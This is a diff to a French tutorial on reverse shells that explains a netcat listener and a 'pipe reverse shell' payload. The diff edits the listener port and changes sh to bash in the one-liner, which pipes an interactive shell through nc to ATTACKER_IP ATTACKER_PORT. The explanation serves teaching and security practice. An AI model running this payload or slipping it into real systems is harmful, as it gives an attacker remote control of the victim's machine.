@@ -73,7 +73,7 @@ Un reverse shell, ou shell inversé, souvent appelé `connect back shell`, est l
 Pour faire ceci, nous devons d'abord mettre en place ce qu'on appelle un `listener` qui va d'abord écouter sur un port de notre IP pour pouvoir récupérer le signal qu'on lui enverra de la machine cible plus tard. On utilise l'outil `netcat` comme ceci :
 
 ```bash
-attacker@kali:~$ nc -lvnp 443
+attacker@kali:~$ nc -lvnp 4444
 listening on [any] 4444 ...
 ```
 
@@ -93,7 +93,7 @@ Et avec ça on peut faire facilement des reverse shells selon la machine qui se 
 
 Mais maintenant nous allons comprendre une commande typique comme celle-ci nommée **pipe reverse shell** :
 
-`rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f`
+`rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f`
 
 Explication de ce payload :
 - `rm -f /tmp/f` cette commande supprime totalement le fichier nommé `f` dans /tmp
